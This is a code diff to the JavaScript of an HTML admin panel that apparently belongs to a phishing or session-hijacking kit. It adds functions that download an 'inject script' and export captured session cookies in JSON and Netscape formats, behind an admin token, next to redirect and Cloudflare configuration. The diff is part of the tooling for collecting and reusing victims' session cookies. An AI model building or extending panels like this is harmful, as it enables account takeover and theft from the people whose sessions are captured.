@@ -1503,40 +1503,41 @@
             }
         });
 
-        // Load Cloudflare status when authenticated
-        function updateAuthUI(authenticated) {
-            isAuthenticated = authenticated;
-            const authSection = document.getElementById('auth-section');
-            const authForm = document.getElementById('auth-form');
-            const authSuccess = document.getElementById('auth-success');
-            const loading = document.getElementById('loading');
-            const sessionsContent = document.getElementById('sessions-content');
-            const noSessions = document.getElementById('no-sessions');
-
+        // Update the updateAuthUI function to include configuration status
+        const originalUpdateAuthUI = updateAuthUI;
+        updateAuthUI = function(authenticated) {
+            originalUpdateAuthUI(authenticated);
             if (authenticated) {
-                authSection.classList.add('authenticated');
-                authForm.style.display = 'none';
-                authSuccess.style.display = 'block';
-                loading.style.display = 'block';
-                sessionsContent.style.display = 'none';
-                noSessions.style.display = 'none';
-                // Load Cloudflare status and redirect config
-                setTimeout(() => {
-                    loadCloudflareStatus();
-                    loadRedirectConfig();
-                }, 500);
-            } else {
-                authSection.classList.remove('authenticated');
-                authForm.style.display = 'block';
-                authSuccess.style.display = 'none';
-                loading.style.display = 'none';
-                sessionsContent.style.display = 'none';
-                noSessions.style.display = 'none';
-                document.getElementById('error').style.display = 'none';
-                // Reset Cloudflare status
-                document.getElementById('cf-status').textContent = 'AUTH REQUIRED';
-                document.getElementById('cf-status').style.color = '#ff6666';
+                setTimeout(() => loadCloudflareStatus(), 1000);
+                setTimeout(() => loadRedirectConfig(), 1000); // Load redirect config as well
             }
+        };
+
+        // Function to download inject script
+        function downloadInject(filename) {
+            if (!adminToken) {
+                alert('Please authenticate first');
+                return;
+            }
+            window.open(`/api/admin/download-inject/${filename}?token=${adminToken}`, '_blank');
+        }
+
+        // Function to download cookies in JSON format
+        function downloadCookiesJSON(sessionId) {
+            if (!adminToken) {
+                alert('Please authenticate first');
+                return;
+            }
+            window.open(`/api/admin/download-cookies/${sessionId}?token=${adminToken}`, '_blank');
+        }
+
+        // Function to download cookies in Netscape format
+        function downloadCookiesNetscape(sessionId) {
+            if (!adminToken) {
+                alert('Please authenticate first');
+                return;
+            }
+            window.open(`/api/admin/download-cookies-netscape/${sessionId}?token=${adminToken}`, '_blank');
         }
     </script>
 </body>
